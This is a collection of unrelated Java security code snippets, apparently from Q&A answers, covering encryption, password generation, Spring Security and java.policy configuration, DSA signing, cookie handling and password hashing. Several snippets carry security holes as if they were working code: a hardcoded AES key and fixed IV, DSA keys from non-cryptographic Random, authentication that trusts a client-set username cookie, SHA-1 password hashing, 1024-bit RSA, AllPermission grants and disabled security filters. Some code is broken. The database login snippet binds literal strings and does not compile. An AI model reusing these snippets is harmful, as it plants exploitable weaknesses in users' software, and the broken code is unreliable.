---UNIQUEIDFORSNIP---|180971887|	import javax.crypto.*;
	import javax.crypto.spec.GCMParameterSpec;
	import java.security.*;
	import java.io.UnsupportedEncodingException;
	public class EncryptDecrypt1 {
		
		public static void main(String[] args) throws Exception {
			EncryptDecrypt1 a = new EncryptDecrypt1();
			String encrypted = a.encrypt("My text");
			System.out.println(encrypted);		
		}
		public String encrypt(String cleartext) throws Exception {
			try 
			{
				// encoding format needs thought
				byte[] clearTextbytes = cleartext.getBytes("UTF-8");
				final SecureRandom secureKeyRandomness = SecureRandom.getInstanceStrong();
				final KeyGenerator AES_keyInstance = KeyGenerator.getInstance("AES");
				AES_keyInstance.init(128, secureKeyRandomness);
				final SecretKey secretKey = AES_keyInstance.generateKey();
				final Cipher AES_cipherInstance = Cipher.getInstance("AES/GCM/NoPadding");
				AES_cipherInstance.init(Cipher.ENCRYPT_MODE, secretKey);
				byte[] encryptedText = AES_cipherInstance.doFinal(clearTextbytes);
				
				byte[] iv = AES_cipherInstance.getIV();
				byte[] message = new byte[12 + clearTextbytes.length + 16];
				System.arraycopy(iv, 0, message, 0, 12);
				System.arraycopy(encryptedText, 0, message, 12, encryptedText.length);
				
				return decrypt(message, secretKey);
			} 
			catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException | UnsupportedEncodingException e) 
			{
				e.printStackTrace();
			}
			return "something went wrong with encrypt";
		} // encrypt.
		public String decrypt(byte[] encryptedText, SecretKey secretKey) throws Exception {
			try 
			{
				final Cipher AES_cipherInstance = Cipher.getInstance("AES/GCM/NoPadding");
				GCMParameterSpec params = new GCMParameterSpec(128, encryptedText, 0, 12);
				AES_cipherInstance.init(Cipher.DECRYPT_MODE, secretKey, params);
				byte[] decryptedText = AES_cipherInstance.doFinal(encryptedText, 12, encryptedText.length - 12);
				return new String(decryptedText, "UTF-8");
			} 
			catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException | UnsupportedEncodingException e) 
			{
				e.printStackTrace();
			}
			return "something went wrong with decrypt";
		}
	}
---UNIQUEIDFORSNIP---|181408193|    String keystorePath = "local.keystore";
    System.setProperty("javax.net.ssl.trustStore", keystorePath);
---UNIQUEIDFORSNIP---|181451823|      sql = "SELECT * FROM EMAIL WHERE TYPE = ?";
      if(haveId) 
        sql += " AND id=?";
      st = createPreparedStatement(sql);
      st.setString(1,type);  
      if(haveId) 
         st.setString(2,id);  
---UNIQUEIDFORSNIP---|181495158|    Required Characters = 26*26*10*32=216,320
---UNIQUEIDFORSNIP---|181495160|    Characters	Possibilities										Bits of Entropy
    10 chars	216,320*94^6  = 149,232,631,038,033,920				~2^57
    11 chars	216,320*94^7  = 14,027,867,317,575,188,480			~2^63
    12 chars	216,320*94^8  = 1,318,619,527,852,067,717,120		~2^70
    13 chars	216,320*94^9  = 123,950,235,618,094,365,409,280		~2^76
    14 chars	216,320*94^10 = 11,651,322,148,100,870,348,472,320	~2^83
---UNIQUEIDFORSNIP---|181495164|    package org.redtown.pw;
    
    import java.util.EnumSet;
    import java.util.HashSet;
    import java.util.Set;
    
    import org.redtown.pw.PasswordGenerator.PasswordCharacterSet;
    
    public class Main {
    
    	public static void main(String[] args) {
    		Set<PasswordCharacterSet> values = new HashSet<PasswordCharacterSet>(EnumSet.allOf(SummerCharacterSets.class));
    		PasswordGenerator pwGenerator = new PasswordGenerator(values, 10, 14);
    		for(int i=0; i < 10; ++i) {
    			System.out.println(pwGenerator.generatePassword());
    		}
    	}
    
    	private static final char[] ALPHA_UPPER_CHARACTERS = { 'A', 'B', 'C', 'D',
    			'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',
    			'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
    	private static final char[] ALPHA_LOWER_CHARACTERS = { 'a', 'b', 'c', 'd',
    			'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
    			'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
    	private static final char[] NUMERIC_CHARACTERS = { '0', '1', '2', '3', '4',
    			'5', '6', '7', '8', '9' };
    	private static final char[] SPECIAL_CHARACTERS = { '~', '`', '!', '@', '#',
    			'$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', '{',
    			']', '}', '\\', '|', ';', ':', '\'', '"', ',', '<', '.', '>', '/',
    			'?' };
    	
    	private enum SummerCharacterSets implements PasswordCharacterSet {
    		ALPHA_UPPER(ALPHA_UPPER_CHARACTERS, 1),
    		ALPHA_LOWER(ALPHA_LOWER_CHARACTERS, 1),
    		NUMERIC(NUMERIC_CHARACTERS, 1),
    		SPECIAL(SPECIAL_CHARACTERS, 1);
    		
    		private final char[] chars;
    		private final int minUsage;
    		
    		private SummerCharacterSets(char[] chars, int minUsage) {
    			this.chars = chars;
    			this.minUsage = minUsage;
    		}
    
    		@Override
    		public char[] getCharacters() {
    			return chars;
    		}
    
    		@Override
    		public int getMinCharacters() {
    			return minUsage;
    		}
    	}
    }
---UNIQUEIDFORSNIP---|181495167|    package org.redtown.pw;
    
    import java.security.SecureRandom;
    import java.util.ArrayList;
    import java.util.Arrays;
    import java.util.Collection;
    import java.util.Collections;
    import java.util.List;
    import java.util.Random;
    
    public class PasswordGenerator {
    
    	private final List<PasswordCharacterSet> pwSets;
    	private final char[] allCharacters;
    	private final int minLength;
    	private final int maxLength;
    	private final int presetCharacterCount;
    	
    	public PasswordGenerator(Collection<PasswordCharacterSet> origPwSets, int minLength, int maxLength) {
    		this.minLength = minLength;
    		this.maxLength = maxLength;
    		
    		// Make a copy of the character arrays and min-values so they cannot be changed after initialization
    		int pwCharacters = 0;
    		int preallocatedCharacters = 0;
    		List<PasswordCharacterSet> pwSets = new ArrayList<PasswordCharacterSet>(origPwSets.size());
    		for(PasswordCharacterSet origpwSet : origPwSets) {
    			PasswordCharacterSet newPwSet = new PwSet(origpwSet);
    			pwSets.add(newPwSet);
    			pwCharacters += newPwSet.getCharacters().length;
    			preallocatedCharacters += newPwSet.getMinCharacters();
    		}
    		this.presetCharacterCount = preallocatedCharacters;
    		this.pwSets = Collections.unmodifiableList(pwSets);
    		
    		if (minLength < presetCharacterCount) {
    			throw new IllegalArgumentException("Combined minimum lengths "
    					+ presetCharacterCount
    					+ " are greater than the minLength of " + minLength);
    		}
    		
    		// Copy all characters into single array so we can evenly access all members when accessing this array
    		char[] allChars = new char[pwCharacters];
    		int currentIndex = 0;
    		for(PasswordCharacterSet pwSet : pwSets) {
    			char[] chars = pwSet.getCharacters();
    			System.arraycopy(chars, 0, allChars, currentIndex, chars.length);
    			currentIndex += chars.length;
    		}
    		this.allCharacters = allChars;
    	}
    	
    
    	public char[] generatePassword() {
    		SecureRandom rand = new SecureRandom();
    		
    		// Set pw length to minLength <= pwLength <= maxLength
    		int pwLength = minLength + rand.nextInt(maxLength - minLength + 1);
    		int randomCharacterCount = pwLength - presetCharacterCount;
    		
    
    		// Place each index in an array then remove them randomly to assign positions in the pw array
    		List<Integer> remainingIndexes = new ArrayList<Integer>(pwLength);
    		for(int i=0; i < pwLength; ++i) {
    			remainingIndexes.add(i);
    		}
    
    		// Fill pw array
    		char[] pw = new char[pwLength];
    		for(PasswordCharacterSet pwSet : pwSets) {
    			addRandomCharacters(pw, pwSet.getCharacters(), pwSet.getMinCharacters(), remainingIndexes, rand);
    		}
    		addRandomCharacters(pw, allCharacters, randomCharacterCount, remainingIndexes, rand);
    		return pw;
    	}
    
    	private static void addRandomCharacters(char[] pw, char[] characterSet,
    			int numCharacters, List<Integer> remainingIndexes, Random rand) {
    		for(int i=0; i < numCharacters; ++i) {
    			// Get and remove random index from the remaining indexes
    			int pwIndex = remainingIndexes.remove(rand.nextInt(remainingIndexes.size()));
    			
    			// Set random character from character index to pwIndex
    			int randCharIndex = rand.nextInt(characterSet.length);
    			pw[pwIndex] = characterSet[randCharIndex];
    		}
    	}
    	
    	public static interface PasswordCharacterSet {
    		char[] getCharacters();
    		int getMinCharacters();
    	}
    	
    	/**
    	 * Defensive copy of a passed-in PasswordCharacterSet
    	 */
    	private static final class PwSet implements PasswordCharacterSet {
    		private final char[] chars;
    		private final int minChars;
    		
    		public PwSet(PasswordCharacterSet pwSet) {
    			this.minChars = pwSet.getMinCharacters();
    			char[] pwSetChars = pwSet.getCharacters();
    			// Defensive copy
    			this.chars = Arrays.copyOf(pwSetChars, pwSetChars.length);
    		}
    
    		@Override
    		public char[] getCharacters() {
    			return chars;
    		}
    
    		@Override
    		public int getMinCharacters() {
    			return minChars;
    		}
    	}
    }
---UNIQUEIDFORSNIP---|181545816|    @Configuration
    @EnableWebSecurity
    @EnableGlobalMethodSecurity(prePostEnabled = true)
    public class AppSecurityConfiguration extends WebSecurityConfigurerAdapter{
    }
---UNIQUEIDFORSNIP---|181612430|    /wos/student/{stid}/school/{scid}
---UNIQUEIDFORSNIP---|181612437|    <security:intercept-url pattern="/student/add.faces" access="ROLE_STUDENTADMIN" />
    <security:intercept-url pattern="/student/createLearningObservation.faces" access="ROLE_USER" />
---UNIQUEIDFORSNIP---|181612444|    <security:intercept-url pattern="/**" access="ROLE_USER" />
---UNIQUEIDFORSNIP---|181721260|C:\Program Files\Java\jre1.8.0_45\lib\security\java.policy
    grant codeBase "http://localhost/-" {
     permission java.security.AllPermission;
     permission java.io.FilePermission "<<ALL FILES>>", "read";
     permission java.io.FilePermission "<<ALL FILES>>", "write";
    };
---UNIQUEIDFORSNIP---|181958545|    ...
    // this is your preferred flag
    private static final int _ReqCreatePattern = 0;
    ...
    Intent intent = new Intent(context, LockPatternActivity.class);
    intent.putExtra(LockPatternActivity._Mode, LockPatternActivity.LPMode.CreatePattern);
    startActivityForResult(intent, _ReqCreatePattern);
---UNIQUEIDFORSNIP---|181958548|    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
        case _ReqCreatePattern:
            if (resultCode == RESULT_OK) {
                String pattern = data.getStringExtra(LockPatternActivity._Pattern);
                ...
            }
            break;
        }
    }
---UNIQUEIDFORSNIP---|181994386|    public class Key {
       int primeCenterie = 20;
       BigInteger q;
       BigInteger p;
       BigInteger g;
       BigInteger y;
       BigInteger x;
       BigInteger k;
       Random rand = new Random();
    Key() {}
    public void generateKey() {
        q = new BigInteger(160, primeCenterie, rand);
        p = generateP(q, 512);
        g = generateG(p, q);
        do {
            x = new BigInteger(q.bitCount(), rand);
        } while (x.compareTo(BigInteger.ZERO) != 1 && x.compareTo(q) != -1);
        y = g.modPow(x, p);
    }
    private BigInteger generateP(BigInteger q, int l) {
        if (l % 64 != 0) {
            throw new IllegalArgumentException("L value is wrong");
        }
        BigInteger pTemp;
        BigInteger pTemp2;
        do {
            pTemp = new BigInteger(l, primeCenterie, rand);
            pTemp2 = pTemp.subtract(BigInteger.ONE);
            pTemp = pTemp.subtract(pTemp2.remainder(q));
        } while (!pTemp.isProbablePrime(primeCenterie) || pTemp.bitLength() != l);
        return pTemp;
    }
    private BigInteger generateG(BigInteger p, BigInteger q) {
        BigInteger aux = p.subtract(BigInteger.ONE);
        BigInteger pow = aux.divide(q);
        BigInteger gTemp;
        do {
            gTemp = new BigInteger(aux.bitLength(), rand);
        } while (gTemp.compareTo(aux) != -1 && gTemp.compareTo(BigInteger.ONE) != 1);
        return gTemp.modPow(pow, p);
    }
    public BigInteger generateK(BigInteger q) {
        BigInteger tempK;
        do {
            tempK = new BigInteger(q.bitLength(), rand);
        } while (tempK.compareTo(q) != -1 && tempK.compareTo(BigInteger.ZERO) != 1);
        return tempK;
    }
    public BigInteger generateR() {
        k = generateK(q);
        BigInteger r = g.modPow(k, p).mod(q);
        return r;
    }
    public BigInteger generateS(BigInteger r, byte[] data) {
        MessageDigest md;
        BigInteger s = BigInteger.ONE;
        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(data);
            BigInteger hash = new BigInteger(md.digest());
            s = (k.modInverse(q).multiply(hash.add(x.multiply(r)))).mod(q);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(DSA.class.getName()).log(Level.SEVERE, null, ex);
        }
        return s;
    }
    boolean verify(byte[] data, BigInteger r, BigInteger s) {
        if (r.compareTo(BigInteger.ZERO) <= 0 || r.compareTo(q) >= 0) {
            return false;
        }
        if (s.compareTo(BigInteger.ZERO) <= 0 || s.compareTo(q) >= 0) {
            return false;
        }
        MessageDigest md;
        BigInteger v = BigInteger.ZERO;
        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(data);
            BigInteger hash = new BigInteger(md.digest());
            BigInteger w = s.modInverse(q);
            BigInteger u1 = hash.multiply(w).mod(q);
            BigInteger u2 = r.multiply(w).mod(q);
            v = ((g.modPow(u1, p).multiply(y.modPow(u2, p))).mod(p)).mod(q);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(DSA.class.getName()).log(Level.SEVERE, null, ex);
        }
        return v.compareTo(r) == 0;
    }}
---UNIQUEIDFORSNIP---|182106360|    @FactoryType(value=FactoryType.Type.POOLED, args={"25"})
---UNIQUEIDFORSNIP---|182120490|    @(http/get "http://gombaszog.sk" {:insecure? true})
---UNIQUEIDFORSNIP---|182159871|    <error-page>
        <!-- Forbidden directory listing -->
        <error-code>403</error-code>
        <location>/general-error.html</location>
    </error-page>
---UNIQUEIDFORSNIP---|182322981|    <message-driven>
    <ejb-name>TESTMDB</ejb-name>
    			<activation-config>
    				<activation-config-property>
    					<activation-config-property-name>destination</activation-config-property-name>
    					<activation-config-property-value>java:/queue/TESTQUEUE</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>destinationType</activation-config-property-name>
    					<activation-config-property-value>javax.jms.Queue</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>hostName</activation-config-property-name>
    					<activation-config-property-value>${MQ.HOST}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>port</activation-config-property-name>
    					<activation-config-property-value>${MQ.PORT}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>channel</activation-config-property-name>
    					<activation-config-property-value>${MQ.CHANNEL}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>queueManager</activation-config-property-name>
    					<activation-config-property-value>${MQ.QMGR}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>transportType</activation-config-property-name>
    					<activation-config-property-value>${MQ.TRANSPORT.TYPE}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>useJNDI</activation-config-property-name>
    					<activation-config-property-value>${USE.JNDI}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>maxPoolDepth</activation-config-property-name>
    					<activation-config-property-value>${OFS.MAX.POOL.DEPTH}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>username</activation-config-property-name>
    					<activation-config-property-value>${MQ.USERNAME}</activation-config-property-value>
    				</activation-config-property>
    				<activation-config-property>
    					<activation-config-property-name>password</activation-config-property-name>
    					<activation-config-property-value>${MQ.PASSWORD}</activation-config-property-value>
    				</activation-config-property>
    			</activation-config>
    			<resource-ref>
    				<res-ref-name>jms/TestJQueueConnectionFactory</res-ref-name>
    				<res-type>javax.jms.ConnectionFactory</res-type>
    				<jndi-name>java:/MQConnectionFactory</jndi-name>
    			</resource-ref>
    			<message-destination-ref>
    				<message-destination-ref-name>jms/ReplyQueue</message-destination-ref-name>
    				<jndi-name>java:/queue/testReplyQueue</jndi-name>
    			</message-destination-ref>
    		</message-driven>
---UNIQUEIDFORSNIP---|182361926|    grant {
        permission java.security.AllPermission;
    }
---UNIQUEIDFORSNIP---|182361928|    grant codeBase "file:./MyApplication.jar" {
        permission java.security.AllPermission;
    }
---UNIQUEIDFORSNIP---|182592773|    byte[] keyBytes = "1234123412341234".getBytes();
    final byte[] ivBytes = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
         0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; //example
    final SecretKey key = new SecretKeySpec(keyBytes, "AES");
    final IvParameterSpec IV = new IvParameterSpec(ivBytes);
    final Cipher cipher = Cipher.getInstance("AES/CFB8/NoPadding"); 
    cipher.init(Cipher.ENCRYPT_MODE, key, IV);
    
    //assuming your Socket is called "socket"
    CipherOutputStream cstream = new CipherOutputStream(socket.getOutputStream(), cipher);
    ... 
    //code to write ChatMessage object
---UNIQUEIDFORSNIP---|182622272|    <s:form name="myForm" method="post" action="mySubmitAction" >
        <s:submit value="Submit"/>
        <s:submit value="Clear" onclick="myClearAction()"/>
    </form>  
    <script>
       function myClearAction(){
         document.forms["myForm"].action = "<s:url action='myClearAction' />";
       }
    </script>   
---UNIQUEIDFORSNIP---|182889764|    URL url = new URL("https://www.google.com");
    HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
    conn.connect();
    
    for(Certificate crt : conn.getServerCertificates()) {
    	System.out.println(crt);
    }
---UNIQUEIDFORSNIP---|183090293|    +-----------+-------------------+-----------------------+
    | Callstack | Class permissions | Permissions in effect |
    +-----------+-------------------+-----------------------+
    | Some      | {Read,Write}      | {Read}                |
    | Other     | {Read}            | {Read}                |
    +-----------+-------------------+-----------------------+
---UNIQUEIDFORSNIP---|183090298|    +-----------+-------------------+-----------------------+
    | Callstack | Class permissions | Permissions in effect |
    +-----------+-------------------+-----------------------+
    | Query     | {Read}            | {}                    |
    | Other     | {}                | {}                    |
    +-----------+-------------------+-----------------------+
---UNIQUEIDFORSNIP---|183090303|    +-----------+-------------------+-----------------------+
    | Callstack | Class permissions | Permissions in effect |
    +-----------+-------------------+-----------------------+
    | Query     | {Read}            | {Read}                |
    | Other     | {}                | {}                    |
    +-----------+-------------------+-----------------------+
---UNIQUEIDFORSNIP---|183090305|    +-----------------+-------------------+-----------------------+
    |    Callstack    | Class permissions | Permissions in effect |
    +-----------------+-------------------+-----------------------+
    | SecurityManager | {}                | {}                    |
    | Query           | {Read}            | {Read}                |
    | Other           | {}                | {}                    |
    +-----------------+-------------------+-----------------------+
---UNIQUEIDFORSNIP---|183090307|    +-----------------+---------------------+-----------------------+
    |    Callstack    |  Class permissions  | Permissions in effect |
    +-----------------+---------------------+-----------------------+
    | SecurityManager | {Read,Write,Delete} | {Read}                |
    | Query           | {Read}              | {Read}                |
    | Other           | {}                  | {}                    |
    +-----------------+---------------------+-----------------------+
---UNIQUEIDFORSNIP---|183103860|    <servlet>
        <servlet-name>spring</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>spring</servlet-name>
        <url-pattern>/*</url-pattern>
    </servlet-mapping>
---UNIQUEIDFORSNIP---|183103862|    <security:http auto-config="true">
            <security:http-basic />
            <security:intercept-url pattern="/**" access="ROLE_USER" />
    </security:http>
---UNIQUEIDFORSNIP---|183416648|    final PySystemState state = new PySystemState();
    state.setClassLoader(new MyClassLoader());
    Py.setSystemState(state);
---UNIQUEIDFORSNIP---|183416650|    public class MyClassLoader extends ClassLoader
    {
      @Override
      protected synchronized Class<?> loadClass(final String className, final boolean resolve)
          throws ClassNotFoundException
      {
        if (className.startsWith("secret.class"))
        {
          throw new RuntimeException();
        }
    
        return MyClassLoader.getSystemClassLoader().loadClass(className);
    
      }
    }
---UNIQUEIDFORSNIP---|183506475|    private static String bytes2String(byte[] bytes)
---UNIQUEIDFORSNIP---|183506477|		byte[] tmp = new byte[10];		
		String a = new String(tmp, "UTF-8");
---UNIQUEIDFORSNIP---|183506482|        int ch;
        while ((ch = fis.read()) != -1)
        {
            sb.append((char)ch);
---UNIQUEIDFORSNIP---|183506484|	public byte[] readBinaryFile(File f) throws IOException
	{		
		byte[] contents = new byte[(int)f.length()];
		BufferedInputStream bis = null;
		try
		{
			bis = new BufferedInputStream(new FileInputStream(f));
			DataInputStream dis = new DataInputStream(bis);
			dis.readFully(contents);
		}
		finally
		{
			if(bis != null)
			{
				bis.close();
			}
		}			
		return contents;			
	}
	
	public void writeBinaryFile(byte[] contents, File f) throws IOException
	{
		BufferedOutputStream bos = null;
		try
		{
			bos = new BufferedOutputStream(new FileOutputStream(f));
			bos.write(contents);
		}
		finally
		{
			if(bos != null)
			{
				bos.close();
			}
		}			
	}
---UNIQUEIDFORSNIP---|183577526|    KeySpec ks = new PKCS8EncodedKeySpec(Base64.decodeBase64(newKey));
---UNIQUEIDFORSNIP---|183577528|    KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
    keyPairGenerator.initialize(1024);
    KeyPair keyPair = keyPairGenerator.genKeyPair();
    // extract the encoded private key, this is an unencrypted PKCS#8 private key
    byte[] encodedprivkey = keyPair.getPrivate().getEncoded();
    System.out.println(Base64.encodeBase64String(encodedprivkey));
---UNIQUEIDFORSNIP---|183778607|    <http pattern="/**" security="none" create-session="never"/>
---UNIQUEIDFORSNIP---|183778609|    <http create-session="never"></http>
---UNIQUEIDFORSNIP---|183830430|    class WhiteList  
    {  
         allowedCommands = ["foo"];  
    }  
---UNIQUEIDFORSNIP---|183830432|    class Main  
    {  
         for(Command command in userInput)  
         { 
               if(command not in allowedCommands)  
               {  
                    log security message;  
                    continue/break
               }  
         }  
    }  
---UNIQUEIDFORSNIP---|183876133|	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// Verify login, and get the username. Assume it's josh
		Cookie cookie = new Cookie("username", "josh");
		cookie.setMaxAge(60*60*24); // 24 hours for expiry
		response.addCookie(cookie);
		
	}
---UNIQUEIDFORSNIP---|183876136|	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		Cookie[] cookies = request.getCookies();
		
		String username = null;
		
		for (Cookie c : cookies) {
			if ("_username".equals(c.getName())) {
				username = c.getValue();
				break;
			}
		}
		
		if (username == null) {
			// Not Logged in. Redirect to Login
		}
		
		// User Logged In. Proceed
	}
---UNIQUEIDFORSNIP---|183976453|permission java.net.SocketPermission "10.6.1.16:1521", "connect, resolve";
---UNIQUEIDFORSNIP---|184025552|    if(ctx.getFilter().toString().contains("objectClass=person")) {
      //Somehow return entries that only correspond to persons on the data base (were you store your directory entries).
    }
---UNIQUEIDFORSNIP---|184025554|    switch (ctx.getScope()) {
        
      case OBJECT:
        //Find a particular entry on your entry database.
      case ONELEVEL:
        //Find all entries that match directly below a given entry.
      case SUBTREE:
        //Find all entries that match recursively below a given entry.
---UNIQUEIDFORSNIP---|184228454|    ClassLoader bootstrapClassLoader = ClassLoader.getSystemClassLoader().getParent();
    List urls = new ArrayList();
    urls.add(new File("yourJarOfXstreamBeanClasses.jar").toURL());
    ClassLoader xstreamClassLoader = new URLClassLoader(urls.toArray(new URL[0]), bootstrapClassLoader);
    XStream xstream = new XStream();
    xstream.setClassLoader(xstreamClassLoader);
---UNIQUEIDFORSNIP---|184260584|    C:\Program Files (x86)\Java\jre7 
---UNIQUEIDFORSNIP---|184264014|    java.security.krb5.kdc
    java.security.krb5.realm
---UNIQUEIDFORSNIP---|184339894|    // note: this list MUST correspond to native secure.c file
    private static String[] secureVmArgs = {
        "-d32",                         /* use 32-bit data model if available */
        "-client",                      /* to select the "client" VM */
        "-server",                      /* to select the "server" VM */
        "-verbose",                     /* enable verbose output */
        "-version",                     /* print product version and exit */
        "-showversion",                 /* print product version and continue */
        "-help",                        /* print this help message */
        "-X",                           /* print help on non-standard options */
        "-ea",                          /* enable assertions */
        "-enableassertions",            /* enable assertions */
        "-da",                          /* disable assertions */
        "-disableassertions",           /* disable assertions */
        "-esa",                         /* enable system assertions */
        "-enablesystemassertions",      /* enable system assertions */
        "-dsa",                         /* disable system assertione */
        "-disablesystemassertions",     /* disable system assertione */
        "-Xmixed",                      /* mixed mode execution (default) */
        "-Xint",                        /* interpreted mode execution only */
        "-Xnoclassgc",                  /* disable class garbage collection */
        "-Xincgc",                      /* enable incremental gc. */
        "-Xbatch",                      /* disable background compilation */
        "-Xprof",                       /* output cpu profiling data */
        "-Xdebug",                      /* enable remote debugging */
        "-Xfuture",                     /* enable strictest checks */
        "-Xrs",                         /* reduce use of OS signals */
        "-XX:+ForceTimeHighResolution", /* use high resolution timer */
        "-XX:-ForceTimeHighResolution", /* use low resolution (default) */
        "-XX:+PrintGCDetails",          /* Gives some details about the GCs */
        "-XX:+PrintGCTimeStamps",       /* Prints GCs times happen to the start of the application */
        "-XX:+PrintHeapAtGC",           /* Prints detailed GC info including heap occupancy */
        "-XX:PrintCMSStatistics",       /* If > 0, Print statistics about the concurrent collections */
        "-XX:+PrintTenuringDistribution",  /* Gives the aging distribution of the allocated objects */
        "-XX:+TraceClassUnloading",     /* Display classes as they are unloaded */
        "-XX:SurvivorRatio",            /* Sets the ratio of the survivor spaces */
        "-XX:MaxTenuringThreshol",      /* Determines how much the objects may age */
        "-XX:CMSMarkStackSize",
        "-XX:CMSMarkStackSizeMax",
        "-XX:+CMSClassUnloadingEnabled",/* It needs to be combined with -XX:+CMSPermGenSweepingEnabled */
        "-XX:+CMSIncrementalMode",      /* Enables the incremental mode */
        "-XX:CMSIncrementalDutyCycleMin",  /* The percentage which is the lower bound on the duty cycle */
        "-XX:+CMSIncrementalPacing",    /* Automatic adjustment of the incremental mode duty cycle */
        "-XX:CMSInitiatingOccupancyFraction",  /* Sets the threshold percentage of the used heap */
        "-XX:+UseConcMarkSweepGC",      /* Turns on concurrent garbage collection */
        "-XX:-ParallelRefProcEnabled",
        "-XX:ParallelGCThreads",        /* Sets the number of parallel GC threads */
        "-XX:ParallelCMSThreads",
        "-XX:+DisableExplicitGC",       /* Disable calls to System.gc() */
        "-XX:+UseCompressedOops",       /* Enables compressed references in 64-bit JVMs */
        "-XX:+UseG1GC",
        "-XX:GCPauseIntervalMillis",
        "-XX:MaxGCPauseMillis"          /* A hint to the virtual machine to pause times */
    };
---UNIQUEIDFORSNIP---|184339896|    	<j2se version="1.6.0+"
			 initial-heap-size="${heap.init}"
             max-heap-size="${heap.max}"
			 java-vm-args="-Djava.security.policy=${jnlp.ip}${jnlp.port}/ed/security/java.policy"/>
---UNIQUEIDFORSNIP---|184552141|	char[] password = …
	final Credentials credentials = new UsernamePasswordCredentials(username, null) {
		@Override
		public String getPassword() {
			// AKCTAT-3791: this helps the GC to clear the String from the memory, as it will be used and dismissed immediately
			// Unfortunately Apache HTTP Client does not allow to pass the byte[] directly
			return new String(password);
		}
	};
	httpClient.getCredentialsProvider().setCredentials(ANY_AUTHSCOPE, (Credentials) auth.getCredentials());
	// ... (do stuff with httpClient)
	Arrays.fill(password, '\0');
---UNIQUEIDFORSNIP---|184636941|     /*
      * Retrieves a UserProfile from the database based on a username and password
      * Needs Apache Commons Codec package otherwise you have to use MessageDigest 
      * which gives a binary SHA-1
      * @param username The username to fetch
      * @param password The unhashed password
      * @return The UserProfile or null if the user was not found in the DB
      */ 
     private static UserProfile retrieveUserProfile(String username, char[] password) 
        throws SQLException {
         password  = DigestUtils.sha1Hex(password);
         //Assuming a pre-setup JDBC Connection object - `con`
         final String updateString = "SELECT userName, password FROM userProfiles" 
           + "WHERE username = ? AND password = ? LIMIT 1";
         PreparedStatement retrieveUserProfile = con.prepareStatement(updateString)
         retrieveUserProfile.setString(1,"username");
         retrieveUserProfile.setString(2,"password");
         ResultSet rs = retrieveUserProfile.execute();
         if(rs.next()) {
             return new UserProfile(username,password);
         }
         else {
             //User Not found
             return null;
         }
     }
---UNIQUEIDFORSNIP---|184666869|    TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    
    TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
    
    TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
---UNIQUEIDFORSNIP---|184793194|    public final boolean authenticate(User user)
    
        MessageDigest md = MessageDigest.getInstance(SHA1);
        
        byte[] saltPassword = (user.getSalt() + user.getPassword()).getBytes();
        byte[] encryptedPassword = md.digest(saltPassword);
        
        String pass = byteArrayToHexString(encryptedPassword);
        
        if (pass.equals(user.getDbPassword())) 
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    private String byteArrayToHexString(byte[] array) {
        String result = "";
        for (int i = 0; i < array.length; i++) {
            result
                    += Integer.toString((array[i] & 0xff) + 0x100, 16).substring(1);
        }
        return result;
    }
---UNIQUEIDFORSNIP---|184922054|    import java.awt.BorderLayout;
    import java.awt.event.ActionEvent;
    import java.awt.event.ActionListener;
    import java.awt.image.BufferedImage;
    import java.io.IOException;
    import java.lang.reflect.InvocationTargetException;
    import java.net.MalformedURLException;
    import java.net.URL;
    
    import javax.imageio.ImageIO;
    import javax.swing.*;
    
    @SuppressWarnings("serial")
    public class SpriteAnimationApplet extends JApplet {
       private static final String SPRITE_SHEET_SPEC = "http://www.funorb.com/img/images/game/"
             + "central/dev_diary/sprite_sheet_full.gif";
       private static final int SPRITE_ROWS = 8; // an 8 x 8 sprite sheet
    
       @Override
       public void init() {
          try {
             final Icon[] icons = SpriteIO.getSprites(SPRITE_SHEET_SPEC, SPRITE_ROWS);
             SwingUtilities.invokeAndWait(new Runnable() {
                public void run() {
                   SpriteAnimationPanel spritePanel = new SpriteAnimationPanel(icons);
                   getContentPane().add(spritePanel);
                   spritePanel.startAnimation();
                }
             });
          } catch (InvocationTargetException e) {
             e.printStackTrace();
             System.exit(-1);
          } catch (InterruptedException e) {
             e.printStackTrace();
             System.exit(-1);
          } catch (MalformedURLException e) {
             e.printStackTrace();
             System.exit(-1);
          } catch (IOException e) {
             e.printStackTrace();
             System.exit(-1);
          }
       }
